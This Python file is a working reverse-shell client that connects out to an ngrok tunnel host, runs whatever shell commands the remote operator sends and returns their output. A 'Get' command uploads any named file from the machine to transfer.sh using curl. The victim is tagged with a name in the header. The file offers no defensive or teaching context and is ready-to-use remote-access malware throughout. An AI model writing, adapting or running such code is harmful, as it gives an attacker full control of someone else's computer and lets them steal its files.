# -------- name --------
name = "Hrushi"
# ----------------------
import time
import re
import os
import socket
import subprocess as sp

host = '0.tcp.ngrok.io'
port = 13862
headerLength = 100

# recive msg of variable length
def recv(serv):
    msg = serv.recv(headerLength).decode()
    n = int(msg)
    msg = serv.recv(n).decode()
    return msg


# send message with header (size of msg)
def send(serv, msg):
    msg = f'{len(str(msg)):<{headerLength}}{msg}'
    serv.send(msg.encode())

# start
try:
    serv = socket.socket()
    serv.connect((host, port))
    while True:
        msg = recv(serv)
        op = ''
        # to exit
        if msg == 'exit':
            continue
        # to change dir
        elif re.match(r"^(sudo\s)?cd .*$", msg):
            try:
                os.chdir(msg[3:])
                op = 'Directory changed to - ' + sp.check_output('pwd', shell=True).decode()
            except:
                op = 'Invalid filepath'
        elif re.match(r'^(sudo)?cd$', msg):
            try:
                os.chdir(os.path.expanduser('~'))
                op = 'Directory changed to - ' + sp.check_output('pwd', shell=True).decode()
            except:
                op = 'Invalid filepath'
        elif (msg == 'hello'):
            send(serv, name)
            continue
        # to get the file from client
        elif re.match(r'^Get .*',msg):
            cmd = "curl -T"+msg[4:]+" --silent -L transfer.sh/"+msg[4:]
            op = sp.check_output(cmd, shell=True).decode()
        # forany linux/unix based command
        else:
            try:
                op = sp.check_output(msg, shell=True).decode()
            except Exception as e:
                op = 'Invalid Command'
        # if command is executing backgroud or have no output 
        if op == '':
            op = 'Command Executed'
        # send output to server
        send(serv, op)
finally:
    # close client server
    serv.close()
